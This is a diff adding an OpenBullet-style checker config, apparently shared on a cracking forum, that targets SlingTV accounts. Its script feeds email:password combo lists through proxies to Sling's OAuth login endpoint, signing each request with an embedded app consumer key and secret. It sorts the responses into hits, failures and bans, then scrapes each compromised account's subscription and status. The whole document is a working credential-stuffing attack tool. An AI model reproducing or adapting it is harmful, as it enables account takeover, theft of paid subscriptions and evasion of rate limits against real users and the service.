@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "SlingTV",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-22T14:03:23.5841614-08:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#1 FUNCTION CurrentUnixTime -> VAR "1" 
+
+#2 FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d" -> VAR "2" 
+
+#3 FUNCTION HMAC SHA1 "BALomd2e4p4A7xKXjQxq94qwnER5FEMEQlwHxHp3&" HmacBase64=TRUE "PUT&https%3A%2F%2Fums.p.sling.com%2Fv3%2Fxauth%2Faccess_token.json&oauth_consumer_key%3DOwa77FUtwJZcKau11Vttf4FoU7qnc6HGRCYAUkKH%26oauth_nonce%3D<2>%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D<1>%26oauth_version%3D1.0" -> VAR "3" 
+
+#4 FUNCTION URLEncode "<3>" -> VAR "4" 
+
+REQUEST PUT "https://ums.p.sling.com/v3/xauth/access_token.json" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"device_guid\":\"44b98374-df5b-5f61-850a-fbb11266df1d\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Partner-Name: GOOGLE" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"Owa77FUtwJZcKau11Vttf4FoU7qnc6HGRCYAUkKH\", oauth_nonce=\"<2>\", oauth_signature=\"<4>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<1>\", oauth_version=\"1.0\"" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.190810.011)" 
+  HEADER "Host: ums.p.sling.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalidEmailOrPassword" 
+  KEYCHAIN Success OR 
+    KEY "oauth_token" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "error code: 1009" 
+
+#tk1 PARSE "<SOURCE>" JSON "oauth_token" -> VAR "tk1" 
+
+#tk2 PARSE "<SOURCE>" JSON "oauth_token_secret" -> VAR "tk2" 
+
+#12 FUNCTION CurrentUnixTime -> VAR "12" 
+
+#13 FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d" -> VAR "13" 
+
+#14 FUNCTION HMAC SHA1 "BALomd2e4p4A7xKXjQxq94qwnER5FEMEQlwHxHp3&<tk2>" HmacBase64=TRUE "GET&https%3A%2F%2Fums.p.sling.com%2Fv2%2Fuser.json&oauth_consumer_key%3DOwa77FUtwJZcKau11Vttf4FoU7qnc6HGRCYAUkKH%26oauth_nonce%3D<13>%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D<12>%26oauth_token%3D<tk1>%26oauth_version%3D1.0" -> VAR "14" 
+
+#15 FUNCTION URLEncode "<14>" -> VAR "15"
+
+REQUEST GET "https://ums.p.sling.com/v2/user.json" 
+  
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.190810.011)" 
+  HEADER "Partner-Name: GOOGLE" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"Owa77FUtwJZcKau11Vttf4FoU7qnc6HGRCYAUkKH\", oauth_nonce=\"<13>\", oauth_signature=\"<15>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<12>\", oauth_token=\"<tk1>\", oauth_version=\"1.0\"" 
+
+#Subscription PARSE "<SOURCE>" LR "subscriptionpacks\":[{\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Status PARSE "<SOURCE>" LR "account_status\":\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Status>" Contains "expired" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Status>" Contains "inactive" 
+    KEY "subscriptionpacks\":[],\"" 
+  KEYCHAIN Success OR 
+    KEY "<Status>" Contains "active" 
+
